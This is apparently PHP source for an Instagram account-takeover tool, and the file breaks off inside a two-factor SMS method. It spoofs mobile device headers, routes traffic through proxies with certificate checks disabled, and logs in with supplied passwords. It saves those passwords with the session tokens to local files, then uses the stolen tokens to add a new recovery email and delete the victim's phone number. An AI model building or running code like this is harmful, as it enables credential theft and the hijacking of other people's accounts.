<?php
session_start();
include 'setting.php';
$setting = new Setting();

class api
{

    protected $fbid;
    protected $newtoken;
    protected $deviceuuid;
    protected $deviceid;
    protected $twocode;
    protected $erenseed;
    protected $back;
    protected $follower_count;
    protected $newmail;
    protected $resultusername;
    protected $changeinfoenc;
    protected $newpassword;
    protected $newusername;
    protected $username;
    protected $id;
    protected $token;
    protected $email;
    protected $phone;
    protected $host;
    protected $X_Ig_App_Locale;
    protected $X_Ig_Device_Locale;
    protected $X_Ig_Mapped_Locale;
    protected $X_Pigeon_Session_Id;
    protected $X_Pigeon_Rawclienttime;
    protected $X_Ig_Bandwidth_Speed_Kbps;
    protected $X_Ig_Bandwidth_Totalbytes_B;
    protected $X_Ig_Bandwidth_Totaltime_Ms;
    protected $X_Bloks_Version_Id;
    protected $X_Ig_Www_Claim;
    protected $X_Bloks_Is_Layout_Rtl;
    protected $X_Ig_Device_Id;
    protected $X_Ig_Family_Device_Id;
    protected $X_Ig_Android_Id;
    protected $X_Ig_Timezone_Offset;
    protected $X_Fb_Connection_Type;
    protected $X_Ig_Connection_Type;
    protected $X_Ig_Capabilities;
    protected $X_Ig_App_Id;
    protected $Priority;
    protected $User_Agent;
    protected $Accept_Language;
    protected $X_Mid;
    protected $Ig_Intended_User_Id;
    protected $Content_Type;
    protected $Content_Length;
    protected $Accept_Encoding;
    protected $X_Fb_Http_Engine;
    protected $X_Fb_Client_Ip;
    protected $X_Fb_Server_Cluster;
    protected $logFile;
    protected $my_status;

    public function __construct()
    {

        $devicejson = file_get_contents('device.json');
        $data = json_decode($devicejson, true);
        $this->host = $data['host'];
        $this->X_Ig_App_Locale = $data['headers']['X-Ig-App-Locale'];
        $this->X_Ig_Device_Locale = $data['headers']['X-Ig-Device-Locale'];
        $this->X_Ig_Mapped_Locale = $data['headers']['X-Ig-Mapped-Locale'];
        $this->X_Pigeon_Session_Id = $data['headers']['X-Pigeon-Session-Id'];
        $this->X_Pigeon_Rawclienttime = $data['headers']['X-Pigeon-Rawclienttime'];
        $this->X_Ig_Bandwidth_Speed_Kbps = $data['headers']['X-Ig-Bandwidth-Speed-Kbps'];
        $this->X_Ig_Bandwidth_Totalbytes_B = $data['headers']['X-Ig-Bandwidth-Totalbytes-B'];
        $this->X_Ig_Bandwidth_Totaltime_Ms = $data['headers']['X-Ig-Bandwidth-Totaltime-Ms'];
        $this->X_Bloks_Version_Id = $data['headers']['X-Bloks-Version-Id'];
        $this->X_Ig_Www_Claim = $data['headers']['X-Ig-Www-Claim'];
        $this->X_Bloks_Is_Layout_Rtl = $data['headers']['X-Bloks-Is-Layout-Rtl'];
        $this->X_Ig_Device_Id = $data['headers']['X-Ig-Device-Id'];
        $this->X_Ig_Family_Device_Id = $data['headers']['X-Ig-Family-Device-Id'];
        $this->X_Ig_Android_Id = $data['headers']['X-Ig-Android-Id'];
        $this->X_Ig_Timezone_Offset = $data['headers']['X-Ig-Timezone-Offset'];
        $this->X_Fb_Connection_Type = $data['headers']['X-Fb-Connection-Type'];
        $this->X_Ig_Connection_Type = $data['headers']['X-Ig-Connection-Type'];
        $this->X_Ig_Capabilities = $data['headers']['X-Ig-Capabilities'];
        $this->X_Ig_App_Id = $data['headers']['X-Ig-App-Id'];
        $this->Priority = $data['headers']['Priority'];
        $this->User_Agent = $data['headers']['User-Agent'];
        $this->Accept_Language = $data['headers']['Accept-Language'];
        $this->X_Mid = $data['headers']['X-Mid'];
        $this->Ig_Intended_User_Id = $data['headers']['Ig-Intended-User-Id'];
        $this->Content_Type = $data['headers']['Content-Type'];
        $this->Content_Length = $data['headers']['Content-Length'];
        $this->Accept_Encoding = $data['headers']['Accept-Encoding'];
        $this->X_Fb_Http_Engine = $data['headers']['X-Fb-Http-Engine'];
        $this->X_Fb_Client_Ip = $data['headers']['X-Fb-Client-Ip'];
        $this->X_Fb_Server_Cluster = $data['headers']['X-Fb-Server-Cluster'];
    }

    public function accounts2s($username)
    {

        $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);

        $directory = dirname(__FILE__);
        $parentDirectory = dirname($directory);
        $parentDirectoryName = basename($parentDirectory);

        $url = "https://$domain/$parentDirectoryName/form/myt.php?username=" . urlencode($username);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
        curl_exec($ch);
        curl_close($ch);
    }


    public function RequestHeader($endpoint, $headers, $post)
    {
        $url = 'https://i.instagram.com/api/v1/' . $endpoint;

        $ch = curl_init();

        global $setting;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_PROXY, $setting->proxy()['proxy']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $setting->proxy()['auth']);
        curl_setopt($ch, CURLOPT_PROXYPORT, $setting->proxy()['port']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['signed_body' => 'SIGNATURE.' . json_encode($post)]));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, "");
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);


        $retry_count = 6;
        $attempt = 0;
        $response = '';

        while ($attempt < $retry_count) {
            $response = curl_exec($ch);

            if (curl_errno($ch)) {

                $error_code = curl_errno($ch);
                $error_message = curl_error($ch);

                $error_log = "Curl Hatası [Kod: $error_code]: $error_message";
                $log_filename = "log/" . basename($error_code) . "_" . date("Y-m-d_H-i-s") . ".log";
                file_put_contents($log_filename, $error_log);

                usleep(1000000);

                $attempt++;
            } else {
                break;
            }
        }

        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);

        curl_close($ch);

        return [
            'headers' => $headers,
            'body' => $body,
        ];
    }


    public function RequestHeaderv2($endpoint, $headers, $post)
    {
        $url = 'https://i.instagram.com/api/v1/' . $endpoint;

        $ch = curl_init();

        global $setting;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_PROXY, $setting->proxy()['proxy']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $setting->proxy()['auth']);
        curl_setopt($ch, CURLOPT_PROXYPORT, $setting->proxy()['port']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, "");
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);


        $retry_count = 6;
        $attempt = 0;
        $response = '';

        while ($attempt < $retry_count) {
            $response = curl_exec($ch);

            if (curl_errno($ch)) {

                $error_code = curl_errno($ch);
                $error_message = curl_error($ch);

                $error_log = "Curl Hatası [Kod: $error_code]: $error_message";
                $log_filename = "log/" . basename($error_code) . "_" . date("Y-m-d_H-i-s") . ".log";
                file_put_contents($log_filename, $error_log);

                usleep(1000000);

                $attempt++;
            } else {
                break;
            }
        }

        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);

        curl_close($ch);

        return [
            'headers' => $headers,
            'body' => $body,
        ];
    }


    public function RequestGETv1($url, $headers)
    {

        global $setting;


        $retry_count = 6;
        $attempt = 0;
        $response = '';

        while ($attempt < $retry_count) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_PROXY, $setting->proxy()['proxy']);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $setting->proxy()['auth']);
            curl_setopt($ch, CURLOPT_PROXYPORT, $setting->proxy()['port']);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_ENCODING, "");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

            $response = curl_exec($ch);

            if (curl_errno($ch)) {
                $error_code = curl_errno($ch);
                $error_message = curl_error($ch);

                $error_log = "Curl Hatası [Kod: $error_code]: $error_message";

                $log_folder = 'log';

                $log_filename = $log_folder . "/" . basename($error_code) . "_" . date("Y-m-d_H-i-s") . ".log";
                file_put_contents($log_filename, $error_log);

                usleep(1000000);

                $attempt++;
            } else {
                break;
            }

            curl_close($ch);
        }

        return $response;
    }


    public function RequestGET($endpoint, $headers)
    {
        $url = 'https://i.instagram.com/api/v1/' . $endpoint;


        $retry_count = 6;
        $attempt = 0;
        $response = '';

        while ($attempt < $retry_count) {
            $ch = curl_init();

            global $setting;
            curl_setopt($ch, CURLOPT_PROXY, $setting->proxy()['proxy']);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $setting->proxy()['auth']);
            curl_setopt($ch, CURLOPT_PROXYPORT, $setting->proxy()['port']);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_ENCODING, "");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

            $response = curl_exec($ch);

            if (curl_errno($ch)) {
                $error_code = curl_errno($ch);
                $error_message = curl_error($ch);

                $error_log = "Curl Hatası [Kod: $error_code]: $error_message";

                $log_folder = 'log';
                if (!file_exists($log_folder)) {
                    mkdir($log_folder, 0777, true);
                }

                $log_filename = $log_folder . "/" . basename($error_code) . "_" . date("Y-m-d_H-i-s") . ".log";
                file_put_contents($log_filename, $error_log);

                usleep(1000000);

                $attempt++;
            } else {
                break;
            }

            curl_close($ch);
        }

        return $response;
    }


    public function generateTimestamp()
    {
        $microtime = microtime(true);
        $timestamp = number_format($microtime, 3, '.', '');

        return $timestamp;
    }

    public function generateSessionId()
    {

        $uniqueId = uniqid('', true);
        $hash = md5($uniqueId);

        $uuid = sprintf(
            'UFS-%08s-%04s-%04s-%04s-%12s-0',
            substr($hash, 0, 8),
            substr($hash, 8, 4),
            substr($hash, 12, 4),
            substr($hash, 16, 4),
            substr($hash, 20, 12)
        );

        return $uuid;
    }


    public function headersget($bearer = null, $user_id = null, $mythic = 'headers2')
    {

        $headers1 = [
            'Host: ' . $this->host,
            'X-Ig-App-Locale: ' . $this->X_Ig_App_Locale,
            'X-Ig-Device-Locale: ' . $this->X_Ig_Device_Locale,
            'X-Ig-Mapped-Locale: ' . $this->X_Ig_Mapped_Locale,
            'X-Pigeon-Session-Id: ' . $this->generateSessionId(),
            'X-Pigeon-Rawclienttime: ' . $this->generateTimestamp(),
            'X-Ig-Bandwidth-Speed-Kbps: ' . $this->X_Ig_Bandwidth_Speed_Kbps,
            'X-Ig-Bandwidth-Totalbytes-B: ' . $this->X_Ig_Bandwidth_Totalbytes_B,
            'X-Ig-Bandwidth-Totaltime-Ms: ' . $this->X_Ig_Bandwidth_Totaltime_Ms,
            'X-Bloks-Version-Id: ' . $this->X_Bloks_Version_Id,
            'X-Ig-Www-Claim: ' . $this->X_Ig_Www_Claim,
            'X-Bloks-Is-Layout-Rtl: ' . ($this->X_Bloks_Is_Layout_Rtl ? 'true' : 'false'),
            'X-Ig-Device-Id: ' . $this->X_Ig_Device_Id,
            'X-Ig-Family-Device-Id: ' . $this->X_Ig_Family_Device_Id,
            'X-Ig-Android-Id: ' . $this->X_Ig_Android_Id,
            'X-Ig-Timezone-Offset: ' . $this->X_Ig_Timezone_Offset,
            'X-Fb-Connection-Type: ' . $this->X_Fb_Connection_Type,
            'X-Ig-Connection-Type: ' . $this->X_Ig_Connection_Type,
            'X-Ig-Capabilities: ' . $this->X_Ig_Capabilities,
            'X-Ig-App-Id: ' . $this->X_Ig_App_Id,
            'Priority: ' . $this->Priority,
            'User-Agent: ' . $this->User_Agent,
            'Accept-Language: ' . $this->Accept_Language,
            'X-Mid: ' . $this->X_Mid,
            'Authorization: ' . $bearer,
            'Ig-U-Ds-User-Id: ' . $user_id,
            'Ig-Intended-User-Id: ' . $user_id,
            'X-Fb-Http-Engine: ' . $this->X_Fb_Http_Engine,
            'X-Fb-Client-Ip: ' . ($this->X_Fb_Client_Ip ? 'True' : 'False'),
            'X-Fb-Server-Cluster: ' . ($this->X_Fb_Server_Cluster ? 'True' : 'False'),
        ];


        $headers2 = [
            'Host: ' . $this->host,
            'X-Ig-App-Locale: ' . $this->X_Ig_App_Locale,
            'X-Ig-Device-Locale: ' . $this->X_Ig_Device_Locale,
            'X-Ig-Mapped-Locale: ' . $this->X_Ig_Mapped_Locale,
            'X-Pigeon-Session-Id: ' . $this->generateSessionId(),
            'X-Pigeon-Rawclienttime: ' . $this->generateTimestamp(),
            'X-Ig-Bandwidth-Speed-Kbps: ' . $this->X_Ig_Bandwidth_Speed_Kbps,
            'X-Ig-Bandwidth-Totalbytes-B: ' . $this->X_Ig_Bandwidth_Totalbytes_B,
            'X-Ig-Bandwidth-Totaltime-Ms: ' . $this->X_Ig_Bandwidth_Totaltime_Ms,
            'X-Bloks-Version-Id: ' . $this->X_Bloks_Version_Id,
            'X-Ig-Www-Claim: ' . $this->X_Ig_Www_Claim,
            'X-Bloks-Is-Layout-Rtl: ' . ($this->X_Bloks_Is_Layout_Rtl ? 'true' : 'false'),
            'X-Ig-Device-Id: ' . $this->X_Ig_Device_Id,
            'X-Ig-Family-Device-Id: ' . $this->X_Ig_Family_Device_Id,
            'X-Ig-Android-Id: ' . $this->X_Ig_Android_Id,
            'X-Ig-Timezone-Offset: ' . $this->X_Ig_Timezone_Offset,
            'X-Fb-Connection-Type: ' . $this->X_Fb_Connection_Type,
            'X-Ig-Connection-Type: ' . $this->X_Ig_Connection_Type,
            'X-Ig-Capabilities: ' . $this->X_Ig_Capabilities,
            'X-Ig-App-Id: ' . $this->X_Ig_App_Id,
            'Priority: ' . $this->Priority,
            'User-Agent: ' . $this->User_Agent,
            'Accept-Language: ' . $this->Accept_Language,
            'X-Mid: ' . $this->X_Mid,
            'Ig-Intended-User-Id: ' . $this->Ig_Intended_User_Id,
            'X-Fb-Http-Engine: ' . $this->X_Fb_Http_Engine,
            'X-Fb-Client-Ip: ' . ($this->X_Fb_Client_Ip ? 'True' : 'False'),
            'X-Fb-Server-Cluster: ' . ($this->X_Fb_Server_Cluster ? 'True' : 'False'),
        ];


        if ($mythic === 'headers1') {
            return $headers1;
        } elseif ($mythic === 'headers2') {
            return $headers2;
        }
    }


    public function log($message, $endpoint, $username)
    {
        $logged = 'log/' . $username . 'login_log.txt';
        $logMessage = $endpoint . " - " . $message . PHP_EOL;
        file_put_contents($logged, $logMessage, FILE_APPEND);
    }

    public function generateRandomAndroidId()
    {
        $prefix = "android-";
        $characters = '0123456789abcdef';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < 16; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        $androidId = $prefix . $randomString;
        return $androidId;
    }

    public function generateRandomFamilyDeviceId()
    {
        $characters = '0123456789abcdef';
        $charactersLength = strlen($characters);
        $uuid = '';
        $sections = [8, 4, 4, 4, 12];
        foreach ($sections as $section) {
            for ($i = 0; $i < $section; $i++) {
                $uuid .= $characters[rand(0, $charactersLength - 1)];
            }
            $uuid .= '-';
        }
        $uuid = rtrim($uuid, '-');
        return $uuid;
    }

    public function generateRandomUUID()
    {
        $characters = '0123456789abcdef';
        $charactersLength = strlen($characters);
        $uuid = '';
        $sections = [8, 4, 4, 4, 12];
        foreach ($sections as $section) {
            for ($i = 0; $i < $section; $i++) {
                $uuid .= $characters[rand(0, $charactersLength - 1)];
            }
            $uuid .= '-';
        }
        $uuid = rtrim($uuid, '-');
        return $uuid;
    }

    public function generateRandomUserAgent()
    {
        $versions = ['237.0.0.14.102', '237.0.0.14.102', '237.0.0.14.102'];
        $androidVersions = ['25/7.1.2', '26/8.0.0', '27/8.1.0', '28/9'];
        $dpIs = ['240dpi', '320dpi', '480dpi'];
        $resolutions = ['720x1280', '1080x1920', '1440x2560'];
        $brands = ['samsung', 'huawei', 'xiaomi'];
        $models = ['SM-G971N', 'SM-G975F', 'HUAWEI P30', 'Xiaomi Mi 9'];
        $hardware = ['beyond1q', 'beyond2q', 'POT-LX1', 'cepheus'];
        $processors = ['qcom', 'exynos', 'kirin'];
        $locales = ['tr_TR', 'en_US', 'es_ES'];
        $numbers = ['373310563', '482510273', '593720384'];

        $version = $versions[array_rand($versions)];
        $androidVersion = $androidVersions[array_rand($androidVersions)];
        $dpi = $dpIs[array_rand($dpIs)];
        $resolution = $resolutions[array_rand($resolutions)];
        $brand = $brands[array_rand($brands)];
        $model = $models[array_rand($models)];
        $hardware = $hardware[array_rand($hardware)];
        $processor = $processors[array_rand($processors)];
        $locale = $locales[array_rand($locales)];
        $number = $numbers[array_rand($numbers)];

        $userAgent = "Instagram $version Android ($androidVersion; $dpi; $resolution; $brand; $model; $hardware; $processor; $locale; $number)";
        return $userAgent;
    }

    public function generateUUID()
    {
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    public function generatePassword($length = 8)
    {
        $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ0123456789";
        $password = "";

        $charsLength = strlen($chars);

        for ($i = 0; $i < $length; $i++) {
            $randomChar = $chars[rand(0, $charsLength - 1)];
            $password .= $randomChar;
        }
        return trim($password);
    }

    public function get_sync()
    {

        $headers = $this->headersget('headers2');

        $post_data = [
            'id' => $this->X_Ig_Family_Device_Id,
            'server_config_retrieval' => '1',
            'experiments' => "ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_caption_typeahead_fix_on_o_universe,ig_android_retry_create_account_universe,ig_android_gmail_oauth_in_reg,ig_android_quickcapture_keep_screen_on,ig_android_smartlock_hints_universe,ig_android_reg_modularization_universe,ig_android_login_identifier_fuzzy_match,ig_android_passwordless_account_password_creation_universe,ig_android_security_intent_switchoff,ig_android_sim_info_upload,ig_android_device_verification_fb_signup,ig_android_reg_nux_headers_cleanup_universe,ig_android_direct_main_tab_universe_v2,ig_android_nux_add_email_device,ig_android_fb_account_linking_sampling_freq_universe,ig_android_device_info_foreground_reporting,ig_android_suma_landing_page,ig_android_device_verification_separate_endpoint,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_android_device_detection_info_upload,ig_android_device_based_country_verification",
        ];

        $ch = curl_init('https://i.instagram.com/api/v1/launcher/mobileconfig/');

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['signed_body' => 'SIGNATURE.' . json_encode($post_data)]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, true);

        $response = curl_exec($ch);

        curl_close($ch);

        if ($response) {
            $headersArray = explode("\r\n", $response);
            foreach ($headersArray as $header) {
                if (strpos($header, 'ig-set-password-encryption-key-id') !== false) {
                    $result['pub_key_id'] = trim(explode(':', $header, 2)[1]);
                } elseif (strpos($header, 'ig-set-password-encryption-pub-key') !== false) {
                    $result['pub_key'] = trim(explode(':', $header, 2)[1]);
                }
            }
        }

        return $result;
    }

    public function encrypt($password)
    {

        $keys = $this->get_sync();
        $public_key = $keys['pub_key'];
        $public_key_id = $keys['pub_key_id'];

        $key = openssl_random_pseudo_bytes(32);
        $iv = openssl_random_pseudo_bytes(12);
        $time = time();

        openssl_public_encrypt($key, $encryptedAesKey, base64_decode($public_key));
        $encrypted = openssl_encrypt($password, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag, strval($time));

        $payload = base64_encode("\x01" | pack('n', intval($public_key_id)) . $iv . pack('s', strlen($encryptedAesKey)) . $encryptedAesKey . $tag . $encrypted);

        return sprintf('#PWD_INSTAGRAM:4:%s:%s', $time, ($payload));
    }

    public function login($username, $password)
    {

        $headers = $this->headersget('headers2');

        $post = [
            'phone_id' => $this->X_Ig_Family_Device_Id,
            'enc_password' => $this->encrypt($password),
            'username' => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            'guid' => $this->X_Ig_Device_Id,
            'device_id' => $this->X_Ig_Android_Id,
        ];

        $response = $this->RequestHeader("accounts/login/", $headers, $post);
        $this->log('accounts/login/', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }


    public function contex($sexsi)
    {
        $data = json_decode($sexsi, true);
        $mythic = $data['layout']['bloks_payload']['tree']['㐟']['#'];

        $pattern = '/\b[A-Za-z0-9\-\_]{70,}\b/';
        if (preg_match($pattern, $mythic, $matches)) {
            return $matches[0];
        } else {
            return null;
        }
    }

    public function currentedituser($bearer, $user_id)
    {

        $headers = $this->headersget($bearer, $user_id, 'headers1');

        $response = $this->RequestGET('accounts/current_user/?edit=true', $headers);

        $data = json_decode($response, true);

        return $data['user']['fbid_v2'];
    }


    public function changeinfodelete($username)
    {
        $filePath = "cookieinfo/$username.json";

        if (file_exists($filePath)) {
            $get = file_get_contents($filePath);

            if ($get === false) {
                echo "Dosya okunamadı.";
            } else {
                $gettir = $get;
            }
        }

        $filePathv2 = "device/$username.json";

        $gettirv2 = file_get_contents($filePathv2);

        $json = json_decode($gettir, true);
        $jsonv2 = json_decode($gettirv2, true);

        $headers = $this->headersget($json['bearer'], $json['user_id'], 'headers1');

        $post = array(
            'params' => json_encode(array(
                'client_input_params' => array(
                    'ig_account_encrypted_auth_proof' => $json['bearer'],
                    'family_device_id' => $jsonv2['uuid']
                ),
                'server_params' => array(
                    'selected_accounts' => ['' . $json['fbid'] . ''],
                    'INTERNAL_INFRA_THEME' => 'harm_f,default,default,harm_f',
                    'INTERNAL__latency_qpl_instance_id' => 2.479831700098E12,
                    'normalized_contact_point' => '+447531313131',
                    'machine_id' => null,
                    'requested_screen_component_type' => null,
                    'INTERNAL__latency_qpl_marker_id' => 36707139,
                    'contact_point_type' => 'phone_number'
                )
            )),
            '_uuid' => $jsonv2['uuid'],
            'bk_client_context' => json_encode(array(
                'bloks_version' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
                'styles_id' => 'instagram'
            )),
            'bloks_versioning_id' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        );

        $this->RequestHeaderv2('bloks/apps/com.bloks.www.fx.settings.contact_point.delete.async/', $headers, $post);
    }

    public function changeinfoverifycode($username, $code)
    {
        $filePath = "cookieinfo/$username.json";

        if (file_exists($filePath)) {
            $get = file_get_contents($filePath);

            if ($get === false) {
                echo "Dosya okunamadı.";
            } else {
                $gettir = $get;
            }
        }

        $filePathv2 = "device/$username.json";

        $gettirv2 = file_get_contents($filePathv2);

        $json = json_decode($gettir, true);
        $jsonv2 = json_decode($gettirv2, true);

        $headers = $this->headersget($json['bearer'], $json['user_id'], 'headers1');

        $post = [
            'params' => json_encode([
                'client_input_params' => [
                    'family_device_id' => $jsonv2['uuid'],
                    'pin_code' => $code
                ],
                'server_params' => [
                    'contact_point_source' => 'fx_settings',
                    'selected_accounts' => ['' . $json['fbid'] . ''],
                    'INTERNAL_INFRA_THEME' => 'harm_f,default,default,harm_f',
                    'INTERNAL__latency_qpl_instance_id' => 2.12067632000056E14,
                    'normalized_contact_point' => $_SESSION['emails2s'],
                    'machine_id' => null,
                    'ig_account_encrypted_auth_proof' => $json['bearer'],
                    'requested_screen_component_type' => null,
                    'INTERNAL__latency_qpl_marker_id' => 36707139,
                    'contact_point_type' => 'email',
                    'contact_point_event_type' => 'add'
                ]
            ]),
            '_uuid' => $jsonv2['uuid'],
            'bk_client_context' => json_encode([
                'bloks_version' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
                'styles_id' => 'instagram'
            ]),
            'bloks_versioning_id' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        ];

        $response = $this->RequestHeaderv2('bloks/apps/com.bloks.www.fx.settings.contact_point.verify.async/', $headers, $post);

        return $response['body'];
    }

    public function changeinfosendcode($username, $email)
    {
        $filePath = "cookieinfo/$username.json";

        if (file_exists($filePath)) {
            $get = file_get_contents($filePath);

            if ($get === false) {
                echo "Dosya okunamadı.";
            } else {
                $gettir = $get;
            }
        }

        $filePathv2 = "device/$username.json";

        $gettirv2 = file_get_contents($filePathv2);

        $json = json_decode($gettir, true);
        $jsonv2 = json_decode($gettirv2, true);

        $headers = $this->headersget($json['bearer'], $json['user_id'], 'headers1');

        $post = [
            'params' => json_encode([
                'client_input_params' => [
                    'family_device_id' => $jsonv2['uuid'],
                    'selected_accounts' => ['' . $json['fbid'] . ''],
                    'contact_point' => $email,
                    'country' => null,
                    'ig_account_encrypted_auth_proof' => $json['bearer'],
                ],
                'server_params' => [
                    'contact_point_source' => 'fx_settings',
                    'INTERNAL_INFRA_THEME' => 'harm_f,default,default,harm_f',
                    'INTERNAL__latency_qpl_instance_id' => 2.04387070300125E14,
                    'should_send_via_whatsapp' => 0,
                    'machine_id' => null,
                    'should_check_for_suspicious_email' => 1,
                    'requested_screen_component_type' => null,
                    'INTERNAL__latency_qpl_marker_id' => 36707139,
                    'contact_point_type' => 'email',
                    'contact_point_event_type' => 'add',
                    'serialized_states' => [
                        'input_error' => '2;20g64gjede;0',
                        'input_error_message' => '2;20g64gjedf;0'
                    ],
                ]
            ]),
            '_uuid' => $jsonv2['uuid'],
            'bk_client_context' => json_encode([
                'bloks_version' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
                'styles_id' => 'instagram'
            ]),
            'bloks_versioning_id' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        ];


        $response = $this->RequestHeaderv2('bloks/apps/com.bloks.www.fx.settings.contact_point.add.async/', $headers, $post);

        $_SESSION['emails2s'] = $email;

        return $response['body'];
    }

    public function cookieget($username)
    {
        $cookie = json_decode(file_get_contents("cookies/$username.json"), true);
        return $cookie;
    }


    public function logged_in_user($bearer, $user_id, $username, $password, $fbid)
    {

        $headers = $this->headersget($bearer, $user_id, 'headers1');

        $post = [
            "_uid" => $user_id,
            "device_id" => $this->X_Ig_Android_Id,
            "_uuid" => $this->X_Ig_Device_Id,
        ];

        $response = $this->RequestHeader("accounts/account_security_info/", $headers, $post);
        $this->log('accounts/account_security_info/', $response['body'], $username);

        $data = json_decode($response['body'], true);

        $email = !empty($data['email']) ? $data['email'] : "Yok";
        $phone_number = !empty($data['phone_number']) ? $data['phone_number'] : "Yok";

        $userdata = [
            'username'   => $username,
            'password'   => $password,
            'token'      => $bearer,
            'id'         => $user_id,
            'email'      => $email,
            'phone'      => $phone_number,
            'fbid'       => $fbid,
        ];

        $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);
        $filename = (__DIR__) . '/cookies' . '/' . $username . '.json';
        file_put_contents($filename, $jsondata);
    }

    public function twofactorSENDSMS($username, $two_factor_identifier)
    {

        $headers = [
            "Host: i.instagram.com",
            "X-Ig-App-Locale: tr_TR",
            "X-Ig-Device-Locale: tr_TR",
            "X-Ig-Mapped-Locale: tr_TR",
            'X-Pigeon-Session-Id: ' . $this->generateSessionId(),
            'X-Pigeon-Rawclienttime: ' . $this->generateTimestamp(),
            "X-Ig-Bandwidth-Speed-Kbps: -1.000",
            "X-Ig-Bandwidth-Totalbytes-B: 0",
            "X-Ig-Bandwidth-Totaltime-Ms: 0",
            "X-Bloks-Version-Id: 8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
            "X-Ig-Www-Claim: 0",
            "X-Bloks-Is-Layout-Rtl: false",
            "X-Ig-Device-Id: " . $this->generateRandomUUID(),
            "X-Ig-Family-Device-Id: " . $this->generateRandomFamilyDeviceId(),
            "X-Ig-Android-Id: " . $this->generateRandomAndroidId(),
            "X-Ig-Timezone-Offset: 10800",
            "X-Ig-Nav-Chain: AD1:login_landing:1:warm_start::",
            "X-Fb-Connection-Type: WIFI",
            "X-Ig-Connection-Type: WIFI",
            "X-Ig-Capabilities: 3brTv10=",
            "X-Ig-App-Id: 567067343352427",
            "Priority: u=3",
            "User-Agent: " . $this->generateRandomUserAgent(),
            "Accept-Language: tr-TR, en-US",
            "Ig-Intended-User-Id: 0",
